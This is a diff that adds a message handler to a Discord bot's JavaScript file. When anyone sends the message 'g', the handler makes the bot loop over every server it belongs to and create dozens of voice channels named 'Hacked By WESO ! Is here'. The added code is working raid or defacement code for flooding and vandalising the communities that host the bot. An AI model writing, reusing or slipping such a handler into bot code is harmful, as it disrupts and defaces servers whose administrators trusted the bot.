@@ -2174,6 +2174,86 @@ client.on('message', message => {
     }
  
   });
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+})
+}
+});
+
 
 
 
